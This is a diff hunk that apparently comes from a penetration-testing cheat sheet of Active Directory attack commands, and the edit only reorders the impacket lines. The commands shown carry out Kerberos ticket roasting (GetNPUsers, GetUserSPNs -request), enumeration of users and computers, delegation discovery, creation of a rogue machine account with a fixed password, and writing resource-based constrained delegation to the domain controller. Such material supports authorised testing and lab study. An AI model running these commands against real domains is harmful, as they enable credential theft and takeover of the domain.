@@ -657,11 +657,11 @@ godap $TARGET -d $DOM -t ldap/$DC -k
 sudo ntpdate -u $TARGET
 
 +---------- Kerberos .ccache Negotiation ----------+
-impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
-impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
+impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
+impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
